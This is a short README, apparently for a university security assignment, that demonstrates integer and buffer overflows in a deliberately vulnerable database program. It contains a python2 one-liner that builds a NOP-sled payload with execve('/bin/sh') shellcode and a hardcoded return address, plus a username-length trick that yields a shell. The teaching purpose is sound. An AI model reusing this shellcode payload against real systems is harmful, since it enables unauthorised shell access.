# CCSEP-Overflow-Demo
Demo of Integer and Buffer overflow within a simple database program

"op" is the unpatched program
- run via "./op"

"oup" is the unpatched program
- run via "./oup"

To buffer overflow the unpatched program:
- make
- gdb oup
- python2 -c 'print("\x90"*159 + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" + "\x90" * 50 + "\x90\xdd\xff\xff\xff\x7f")' >exploit.txt
- r < exploit.txt
Note: This will be PC specific as it relies on memory addresses but I included it here incase it works for you and for my own benefit.

To integer overflow the unpatched program:
- Input a 16 character username then login with that username to receive a shell.

Known Issue:
- The unpatched program will ask for a username and then display the menu and run the add_user method again, which will change the database adding a blank user every time gets is called once because it is within the menu while loop. I have attempted to remedy this problem but I've not found a solution and put it down to something to do with the gets() method itself as it does not occur on the patched version. The exploits still behave as they should and the program demonstrates each appropriately enough for the purposes of this assessment.
